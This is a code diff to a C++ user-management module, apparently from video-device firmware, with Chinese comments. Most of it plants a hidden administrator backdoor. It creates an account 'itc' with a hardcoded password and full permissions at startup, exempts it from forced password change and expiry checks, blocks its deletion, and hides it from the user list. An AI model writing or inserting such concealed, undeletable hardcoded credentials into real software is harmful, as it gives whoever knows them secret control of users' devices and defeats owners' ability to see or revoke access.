@@ -61,7 +61,45 @@ IpcRet_E CUserManage::init()
     }
 
     dlog_info("%d个用户账号状态已重置为正常状态", updatedCount);
- 
+
+    /* 自动添加隐藏的itc产测账号 */
+    std::vector<User::UserInfo_S> itcUsers;
+    CUserDatabase::instance()->find(Element(USER_FIELD_ACCOUNT, "itc"), itcUsers);
+    if (itcUsers.empty())
+    {
+        User::UserInfo_S stItcUser;
+        stItcUser.stAccountInfo.account = "itc";
+        stItcUser.stAccountInfo.password = "itc@1993";
+        stItcUser.stAccountInfo.nAccountType = User::ACCOUNT_TYPE_ADMIN;
+        stItcUser.stAccountInfo.nSafety = User::Safety_E::SKYHIGH_LEVEL;
+        stItcUser.stBindInfo.name = "ITC";
+        stItcUser.stPermissions.stMenuPermission.bPreview = true;
+        stItcUser.stPermissions.stMenuPermission.bPlayback = true;
+        stItcUser.stPermissions.stMenuPermission.bRetrieve = true;
+        stItcUser.stPermissions.stMenuPermission.bAdhibition = true;
+        stItcUser.stPermissions.stMenuPermission.bWebLocalConfig = true;
+        stItcUser.stPermissions.stMenuPermission.bSystemConfig = true;
+        stItcUser.stPermissions.stMenuPermission.bNetworkConfig = true;
+        stItcUser.stPermissions.stMenuPermission.bChannelManage = true;
+        stItcUser.stPermissions.stMenuPermission.bVideoAndAudio = true;
+        stItcUser.stPermissions.stMenuPermission.bEventConfig = true;
+        stItcUser.stPermissions.stMenuPermission.bVideoManage = true;
+        stItcUser.stPermissions.stMenuPermission.bObjectLib = true;
+        stItcUser.stPermissions.stMenuPermission.bVehicleDetecConfig = true;
+        stItcUser.stPermissions.stMenuPermission.bLocalShutdown = true;
+        stItcUser.stPermissions.stOperatePermission.bPTZControl = true;
+        stItcUser.stPermissions.stOperatePermission.bRound = true;
+        stItcUser.stPermissions.stOperatePermission.bTalk = true;
+        stItcUser.stPermissions.stOperatePermission.bRecord = true;
+        stItcUser.stPermissions.stOperatePermission.bRestart = true;
+        stItcUser.stPermissions.stOperatePermission.bSimpleRecovery = true;
+        stItcUser.stPermissions.stOperatePermission.bFullRecovery = true;
+        stItcUser.stPermissions.stOperatePermission.bParameterDerivation = true;
+        stItcUser.stPermissions.stOperatePermission.bUpgrade = true;
+        stItcUser.stPermissions.stOperatePermission.bActionAlarm = true;
+        CUserDatabase::instance()->add(stItcUser);
+        dlog_info("隐藏账号 itc 已自动添加");
+    }
     
     return OK;
 }
@@ -291,16 +329,19 @@ int CUserManage::login(User::AccountInfo_S stAccountInfo, User::UserInfo_S &stUs
 
     stUserInfo = userInfos[0];
 
-    /*识别用户第一次登陆或者密码不符合规范则强制重置密码*/
-    if ((result != IpcRet_E::OK && !stSecurityServicesInfo.stPwdPolicy.bPwdSecurityLevelEnable)
-        || stUserInfo.stAccountInfo.strFirstLoginTime.empty())
+    /* itc隐藏用户跳过首次强制改密和密码过期校验 */
+    if (stUserInfo.stAccountInfo.account != "itc")
     {
-        set_pending_password_update_time(stUserInfo.stAccountInfo.account, strNowTime);
-        return IpcRet_E::PASS_ERR_FIRST_LOGIN_PWD_CHANGE;
-    }
+        /*识别用户第一次登陆或者密码不符合规范则强制重置密码*/
+        if ((result != IpcRet_E::OK && !stSecurityServicesInfo.stPwdPolicy.bPwdSecurityLevelEnable)
+            || stUserInfo.stAccountInfo.strFirstLoginTime.empty())
+        {
+            set_pending_password_update_time(stUserInfo.stAccountInfo.account, strNowTime);
+            return IpcRet_E::PASS_ERR_FIRST_LOGIN_PWD_CHANGE;
+        }
 
-    /*检测密码是否已过期-90天周期-不强制重置密码*/
-    if (!stUserInfo.stAccountInfo.strFirstLoginTime.empty() && !strNowTime.empty()){
+        /*检测密码是否已过期-90天周期-不强制重置密码*/
+        if (!stUserInfo.stAccountInfo.strFirstLoginTime.empty() && !strNowTime.empty()){
         std::tm tmFirst = {};
         std::istringstream ss(stUserInfo.stAccountInfo.strFirstLoginTime);
         ss >> std::get_time(&tmFirst, "%Y-%m-%d %H:%M:%S");
@@ -335,6 +376,7 @@ int CUserManage::login(User::AccountInfo_S stAccountInfo, User::UserInfo_S &stUs
             }
  
         }
+    }
     }
 
     /* 检查同一IP是否已登录 */
@@ -418,6 +460,11 @@ int CUserManage::add(User::UserInfo_S stUserInfo,::System::SecurityServices_S st
         }
     }
 
+    // auto now = std::chrono::system_clock::now();
+    // std::time_t t = std::chrono::system_clock::to_time_t(now);
+    // std::stringstream ss;
+    // ss << std::put_time(std::localtime(&t), "%Y-%m-%d %H:%M:%S");
+    // stUserInfo.stAccountInfo.strFirstLoginTime = ss.str();
     int nRet;
     nRet = CUserDatabase::instance()->add(stUserInfo);
     if (nRet < 0)
@@ -437,9 +484,10 @@ int CUserManage::add(User::UserInfo_S stUserInfo,::System::SecurityServices_S st
 int CUserManage::del(User::UserInfo_S stUserInfo)
 {
     int nRet = 0;
-    if (stUserInfo.stAccountInfo.account == "admin")
+    if (stUserInfo.stAccountInfo.account == "admin"
+        || stUserInfo.stAccountInfo.account == "itc")
     {
-        dlog_error("无法删除admin用户");
+        dlog_error("无法删除%s用户", stUserInfo.stAccountInfo.account.c_str());
         return -1;
     }
 
@@ -491,6 +539,13 @@ int CUserManage::del(User::UserInfo_S stUserInfo)
  */
 int CUserManage::del(User::AccountInfo_S stAccountInfo)
 {
+    if (stAccountInfo.account == "admin"
+        || stAccountInfo.account == "itc")
+    {
+        dlog_error("无法删除%s用户", stAccountInfo.account.c_str());
+        return -1;
+    }
+
     Item item;
     item.push_back(Element(USER_FIELD_ACCOUNT, stAccountInfo.account));
     return CUserDatabase::instance()->del(item);
@@ -560,7 +615,10 @@ int CUserManage::update(User::UpdateInfo_S stUserUpdateInfo, ::System::SecurityS
     item.push_back(Element(USER_FIELD_PASSWORD, stUserUpdateInfo.stNewUserInfo.stAccountInfo.password));
     item.push_back(Element(USER_FIELD_ACCOUNT_TYPE, stUserUpdateInfo.stNewUserInfo.stAccountInfo.nAccountType));
     item.push_back(Element(USER_FIELD_ACCOUNT_SAFETY, stUserUpdateInfo.stNewUserInfo.stAccountInfo.nSafety));
-    item.push_back(Element(USER_FIELD_LOGO_FIRST_TIME, stUserUpdateInfo.stNewUserInfo.stAccountInfo.strFirstLoginTime));
+    if(!stUserUpdateInfo.stNewUserInfo.stAccountInfo.strFirstLoginTime.empty())
+    {
+    item.push_back(Element(USER_FIELD_LOGO_FIRST_TIME, stUserUpdateInfo.stNewUserInfo.stAccountInfo.strFirstLoginTime));          
+    }
     item.push_back(Element(USER_FIELD_NAME, stUserUpdateInfo.stNewUserInfo.stBindInfo.name));
     item.push_back(Element(USER_FIELD_PHONE_NUMBER, stUserUpdateInfo.stNewUserInfo.stBindInfo.phoneNumber));
     item.push_back(Element(USER_FIELD_LOGO_PATH, stUserUpdateInfo.stNewUserInfo.stBindInfo.logoPath));
@@ -871,6 +929,11 @@ int CUserManage::get_all_user(std::vector<User::UserInfo_S> &userInfos)
 {
     MatchMethods emptyMethods;
     CUserDatabase::instance()->find(emptyMethods, userInfos);
+
+    /* 过滤隐藏的itc账号 */
+    userInfos.erase(std::remove_if(userInfos.begin(), userInfos.end(),
+        [](const User::UserInfo_S &u) { return u.stAccountInfo.account == "itc"; }),
+        userInfos.end());
 
     return 0;
 }
